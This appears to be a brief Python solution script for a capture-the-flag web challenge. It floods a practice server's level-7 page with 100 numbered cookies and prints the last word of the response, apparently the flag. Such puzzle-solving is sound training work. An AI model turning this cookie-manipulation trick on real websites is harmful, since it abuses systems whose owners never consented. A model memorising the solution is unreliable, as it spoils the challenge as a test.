import requests
url = "http://kslweb1.spb.ctf.su/first/level7/"
cookies = {str(i): str(i) for i in range(100)}
req = requests.get(url, cookies=cookies)
print(req.content.split()[-1])